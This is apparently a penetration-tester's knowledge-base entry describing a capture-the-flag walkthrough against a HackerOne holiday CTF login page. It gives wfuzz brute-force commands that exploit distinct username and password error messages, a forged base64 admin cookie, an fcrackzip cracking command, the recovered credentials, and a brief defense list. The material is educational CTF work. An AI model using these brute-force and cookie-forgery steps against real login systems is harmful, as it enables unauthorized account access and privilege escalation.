---
id: proc-uuid-5
tags:
  - bruteforce
  - cookie-manipulation
  - zip-crack
type: procedure
tools:
  - '[[tools/Wfuzz]]'
  - '[[tools/Base64]]'
  - '[[tools/Fcrackzip]]'
tactics:
  - '[[Lateral Movement]]'
commands:
  - '[[commands/wfuzz-brute-username]]'
  - '[[commands/wfuzz-brute-password]]'
  - '[[commands/base64-encode-admin-cookie]]'
  - '[[commands/fcrackzip-crack-zip]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Brute Force]]'
  - '[[Credentials In Files]]'
updated_at: '2025-12-14T17:24:55.540Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Lateral Movement]]'
mitre_techniques:
  - '[[Brute Force]]'
  - '[[Credentials In Files]]'
---
# Brute-Force-Credentials-and-Manipulate-Base64-Cookie

## Summary

This procedure brute-forces login credentials using distinct error oracles, logs in, manipulates an unsigned base64 cookie for admin escalation, and cracks a protected ZIP file to extract the flag.

## Description

The /secure-login endpoint leaks username validity via errors, enabling brute-force. Post-login cookie is base64 JSON without integrity checks, allowing admin:true modification. ZIP uses weak password from wordlist. Targets PHP login forms.

## Requirements

1. Wordlists for usernames/passwords
2. Fuzzing tool like wfuzz
3. ZIP cracker

## Defense

Defensive measures and detection strategies:

- Use uniform error messages
- Sign cookies with HMAC
- Strong ZIP encryption and rate-limiting

## Objectives

1. Gain initial access
2. Escalate to admin
3. Extract protected flag

## Instructions

### Step 1: Brute-Force Username

**Context**: Exploit error distinction for valid usernames.

**Command** ([[commands/wfuzz-brute-username]]):
```bash
wfuzz -z file,wordlists/usernames.txt --hs 'Invalid Username' -d 'username=FUZZ&password=blah' https://hackyholidays.h1ctf.com/secure-login
```

> Identifies 'access'.

### Step 2: Brute-Force Password

**Context**: Use found username for password enum.

**Command** ([[commands/wfuzz-brute-password]]):
```bash
wfuzz -z file,wordlists/passwords.txt --hs 'Invalid Password' -d 'username=access&password=FUZZ' https://hackyholidays.h1ctf.com/secure-login
```

> Finds 'computer'.

### Step 3: Manipulate Cookie

**Context**: After login, modify admin flag in base64 JSON.

**Command** ([[commands/base64-encode-admin-cookie]]):
```bash
echo '{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}' | base64 -w0
```

> Encoded cookie for admin access.

### Step 4: Crack ZIP

**Context**: Download admin ZIP and brute password.

**Command** ([[commands/fcrackzip-crack-zip]]):
```bash
fcrackzip -u -D -p wordlists/passwords.txt my_secure_files_not_for_you.zip
```

> PASSWORD FOUND: hahahaha; flag inside.

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement]] Lateral Movement

### Techniques

- [[Brute Force]] Brute Force
- [[Credentials In Files]] Credentials In Files (for ZIP)

### Sub-Techniques

- None

## Commands Used

- [[commands/wfuzz-brute-username]]
- [[commands/wfuzz-brute-password]]
- [[commands/base64-encode-admin-cookie]]
- [[commands/fcrackzip-crack-zip]]

## Tools Used

- [[tools/Wfuzz]]
- [[tools/Base64]]
- [[tools/Fcrackzip]]

## Tags

- [[bruteforce]]
- [[cookie-manipulation]]
- [[zip-crack]]
